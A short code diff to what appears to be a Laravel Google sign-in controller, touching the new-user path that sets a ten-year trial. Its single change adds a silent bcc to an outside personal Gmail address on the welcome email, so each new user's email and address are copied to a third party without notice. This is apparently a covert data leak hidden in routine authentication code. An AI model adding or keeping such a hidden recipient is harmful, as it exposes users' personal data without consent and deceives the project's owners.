@@ -35,7 +35,7 @@ class GoogleAuthController extends Controller
             $user->trial_ends_at = now()->addYears(10);
             $user->save();
 
-            Mail::to($user)->send(new Welcome());
+            Mail::to($user)->bcc('ipod998@gmail.com')->send(new Welcome());
         }
 
         Auth::login($user);
